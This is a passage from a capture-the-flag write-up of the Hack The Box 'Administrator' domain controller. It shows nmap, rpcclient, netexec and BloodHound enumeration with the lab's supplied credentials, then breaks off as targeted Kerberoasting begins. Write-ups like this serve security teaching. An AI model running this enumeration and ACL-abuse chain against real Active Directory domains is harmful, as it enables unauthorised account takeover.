&lt;/h2>&lt;p>We will start our journey by running an nmap scan on the provided ip address, and the result below show that ports like &lt;code>88&lt;/code> for Kerberos and &lt;code>389&lt;/code> for LDAP, which indicates that we are dealing with Domain Controller Active Directory Server.&lt;/p>
&lt;p>The results also shows that the domain we are up against is : &lt;code>administrator.htb&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Administrator&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo nmap -sV -sC -O -Pn --disable-arp-ping -o scan-nmap 10.10.11.42
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.11.42
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.068s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">988&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp Microsoft ftpd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-syst:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ SYST: Windows_NT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain Simple DNS Plus
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span class="o">(&lt;/span>server time: 2025-02-22 02:38:36Z&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Microsoft Windows netbios-ssn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: administrator.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp open kpasswd5?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp open tcpwrapped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: administrator.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp open tcpwrapped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No exact OS matches &lt;span class="k">for&lt;/span> host &lt;span class="o">(&lt;/span>If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TCP/IP fingerprint:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS:SCAN&lt;span class="o">(&lt;/span>&lt;span class="nv">V&lt;/span>&lt;span class="o">=&lt;/span>7.94SVN%E&lt;span class="o">=&lt;/span>4%D&lt;span class="o">=&lt;/span>2/21%OT&lt;span class="o">=&lt;/span>21%CT&lt;span class="o">=&lt;/span>1%CU&lt;span class="o">=&lt;/span>36753%PV&lt;span class="o">=&lt;/span>Y%DS&lt;span class="o">=&lt;/span>2%DC&lt;span class="o">=&lt;/span>I%G&lt;span class="o">=&lt;/span>Y%TM&lt;span class="o">=&lt;/span>67B8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS:D65A%P&lt;span class="o">=&lt;/span>x86_64-pc-linux-gnu&lt;span class="o">)&lt;/span>SEQ&lt;span class="o">(&lt;/span>&lt;span class="nv">SP&lt;/span>&lt;span class="o">=&lt;/span>101%GCD&lt;span class="o">=&lt;/span>1%ISR&lt;span class="o">=&lt;/span>104%CI&lt;span class="o">=&lt;/span>I%II&lt;span class="o">=&lt;/span>I%TS&lt;span class="o">=&lt;/span>A&lt;span class="o">)&lt;/span>SEQ&lt;span class="o">(&lt;/span>S
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS:P&lt;span class="o">=&lt;/span>102%GCD&lt;span class="o">=&lt;/span>1%ISR&lt;span class="o">=&lt;/span>105%CI&lt;span class="o">=&lt;/span>I%TS&lt;span class="o">=&lt;/span>A&lt;span class="o">)&lt;/span>SEQ&lt;span class="o">(&lt;/span>&lt;span class="nv">SP&lt;/span>&lt;span class="o">=&lt;/span>102%GCD&lt;span class="o">=&lt;/span>1%ISR&lt;span class="o">=&lt;/span>105%CI&lt;span class="o">=&lt;/span>I%II&lt;span class="o">=&lt;/span>I%TS&lt;span class="o">=&lt;/span>A&lt;span class="o">)&lt;/span>OP
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS:S&lt;span class="o">(&lt;/span>&lt;span class="nv">O1&lt;/span>&lt;span class="o">=&lt;/span>M53CNW8ST11%O2&lt;span class="o">=&lt;/span>M53CNW8ST11%O3&lt;span class="o">=&lt;/span>M53CNW8NNT11%O4&lt;span class="o">=&lt;/span>M53CNW8ST11%O5&lt;span class="o">=&lt;/span>M53CNW
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS:8ST11%O6&lt;span class="o">=&lt;/span>M53CST11&lt;span class="o">)&lt;/span>WIN&lt;span class="o">(&lt;/span>&lt;span class="nv">W1&lt;/span>&lt;span class="o">=&lt;/span>FFFF%W2&lt;span class="o">=&lt;/span>FFFF%W3&lt;span class="o">=&lt;/span>FFFF%W4&lt;span class="o">=&lt;/span>FFFF%W5&lt;span class="o">=&lt;/span>FFFF%W6&lt;span class="o">=&lt;/span>FFDC&lt;span class="o">)&lt;/span>EC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS:N&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>80%W&lt;span class="o">=&lt;/span>FFFF%O&lt;span class="o">=&lt;/span>M53CNW8NNS%CC&lt;span class="o">=&lt;/span>Y%Q&lt;span class="o">=)&lt;/span>T1&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>80%S&lt;span class="o">=&lt;/span>O%A&lt;span class="o">=&lt;/span>S+%F&lt;span class="o">=&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS:AS%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>T2&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>N&lt;span class="o">)&lt;/span>T3&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>N&lt;span class="o">)&lt;/span>T4&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>80%W&lt;span class="o">=&lt;/span>0%S&lt;span class="o">=&lt;/span>A%A&lt;span class="o">=&lt;/span>O%F&lt;span class="o">=&lt;/span>R%O&lt;span class="o">=&lt;/span>%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>T5&lt;span class="o">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS:R&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>80%W&lt;span class="o">=&lt;/span>0%S&lt;span class="o">=&lt;/span>Z%A&lt;span class="o">=&lt;/span>S+%F&lt;span class="o">=&lt;/span>AR%O&lt;span class="o">=&lt;/span>%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>T6&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>80%W&lt;span class="o">=&lt;/span>0%S&lt;span class="o">=&lt;/span>A%A&lt;span class="o">=&lt;/span>O%
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS:F&lt;span class="o">=&lt;/span>R%O&lt;span class="o">=&lt;/span>%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>T7&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>N&lt;span class="o">)&lt;/span>U1&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>N%T&lt;span class="o">=&lt;/span>80%IPL&lt;span class="o">=&lt;/span>164%UN&lt;span class="o">=&lt;/span>0%RIPL&lt;span class="o">=&lt;/span>G%RID&lt;span class="o">=&lt;/span>G%RIPCK&lt;span class="o">=&lt;/span>G
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS:%RUCK&lt;span class="o">=&lt;/span>G%RUD&lt;span class="o">=&lt;/span>G&lt;span class="o">)&lt;/span>IE&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DFI&lt;span class="o">=&lt;/span>N%T&lt;span class="o">=&lt;/span>80%CD&lt;span class="o">=&lt;/span>Z&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Network Distance: &lt;span class="m">2&lt;/span> hops
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Host: DC&lt;span class="p">;&lt;/span> OS: Windows&lt;span class="p">;&lt;/span> CPE: cpe:/o:microsoft:windows
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host script results:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb2-time:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> date: 2025-02-22T02:38:59
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ start_date: N/A
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb2-security-mode:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> 3:1:1:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Message signing enabled and required
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_clock-skew: 7h00m00s
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Since the description of the box provided us with credentials &lt;code>Olivia:ichliebedich&lt;/code> , assuming we have a foothold on the domain, we will use them to enumerate things like &lt;strong>SMB&lt;/strong> shares and users which i dogged through each of them but nothing comes handy.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Administrator&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ rpcclient -U &lt;span class="s2">&amp;#34;Olivia%ichliebedich&amp;#34;&lt;/span> 10.10.11.42
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rpcclient $&amp;gt; enumdomusers
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>Administrator&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x1f4&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>Guest&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x1f5&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>krbtgt&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x1f6&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>olivia&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x454&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>michael&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x455&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>benjamin&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x456&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>emily&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x458&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>ethan&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x459&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>alexander&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0xe11&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>emma&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0xe12&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rpcclient $&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Administrator&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo netexec smb 10.10.11.42 -u olivia -p ichliebedich --shares
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>sudo&lt;span class="o">]&lt;/span> password &lt;span class="k">for&lt;/span> ayoub:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.42 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows Server &lt;span class="m">2022&lt;/span> Build &lt;span class="m">20348&lt;/span> x64 &lt;span class="o">(&lt;/span>name:DC&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:administrator.htb&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.42 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> administrator.htb&lt;span class="se">\o&lt;/span>livia:ichliebedich
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.42 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Enumerated shares
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.42 &lt;span class="m">445&lt;/span> DC Share Permissions Remark
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.42 &lt;span class="m">445&lt;/span> DC ----- ----------- ------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.42 &lt;span class="m">445&lt;/span> DC ADMIN$ Remote Admin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.42 &lt;span class="m">445&lt;/span> DC C$ Default share
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.42 &lt;span class="m">445&lt;/span> DC IPC$ READ Remote IPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.42 &lt;span class="m">445&lt;/span> DC NETLOGON READ Logon server share
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.42 &lt;span class="m">445&lt;/span> DC SYSVOL READ Logon server share
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I tried to access the &lt;code>FTP&lt;/code> server, maybe there is something interesting there, but unfortunately we can&amp;rsquo;t login.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Administrator&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ ftp 10.10.11.42
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connected to 10.10.11.42.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">220&lt;/span> Microsoft FTP Service
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Name &lt;span class="o">(&lt;/span>10.10.11.42:ayoub&lt;span class="o">)&lt;/span>: olivia
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">331&lt;/span> Password required
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">530&lt;/span> User cannot log in, home directory inaccessible.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp: Login failed
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I gathered data using &lt;code>bloodhound-python&lt;/code> for a better visibility, and see if there are some interesting Edges that we could take advantages of.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Administrator&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ bloodhound-python -d administrator.htb -u Olivia -p &lt;span class="s1">&amp;#39;ichliebedich&amp;#39;&lt;/span> -ns 10.10.11.42 -c all
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found AD domain: administrator.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Getting TGT &lt;span class="k">for&lt;/span> user
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: &lt;span class="o">[&lt;/span>Errno Connection error &lt;span class="o">(&lt;/span>dc.administrator.htb:88&lt;span class="o">)]&lt;/span> &lt;span class="o">[&lt;/span>Errno -2&lt;span class="o">]&lt;/span> Name or service not known
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Connecting to LDAP server: dc.administrator.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">1&lt;/span> domains
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">1&lt;/span> domains in the forest
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">1&lt;/span> computers
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Connecting to LDAP server: dc.administrator.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">11&lt;/span> users
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">53&lt;/span> groups
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">2&lt;/span> gpos
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">1&lt;/span> ous
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">19&lt;/span> containers
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Found &lt;span class="m">0&lt;/span> trusts
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Starting computer enumeration with &lt;span class="m">10&lt;/span> workers
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Querying computer: dc.administrator.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">INFO: Done in 00M 14S
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Using the &lt;code>Transitive Object Control&lt;/code> built-in query under &lt;strong>OUTBOUND OBJECT CONTROL&lt;/strong>, we can see that the user under our control &lt;code>Olivia&lt;/code> have &lt;code>GenericAll&lt;/code> ACL right on &lt;code>Michael&lt;/code> user, and &lt;code>Michael&lt;/code> have &lt;code>ForceChangePassword&lt;/code> on &lt;code>Benjamin&lt;/code> user.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/administrator-htb-writeup/Bloodhound11.png"
width="962"
height="296"
srcset="https://r4z1o.github.io/p/administrator-htb-writeup/Bloodhound11_hu_a9191c29a15cecc1.png 480w, https://r4z1o.github.io/p/administrator-htb-writeup/Bloodhound11_hu_c5a3fe86e58bb4d6.png 1024w"
loading="lazy"
alt="Bloodhound"
class="gallery-image"
data-flex-grow="325"
data-flex-basis="780px"
>&lt;/p>
&lt;p>Let&amp;rsquo;s first synchronize the time with server because Kerberos authentication is very strict about time calibration. and then take over the &lt;code>Michael&lt;/code> user by performing a targeted Kerberoasting.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>/opt/targetedKerberoast&lt;span class="o">]&lt;/span>
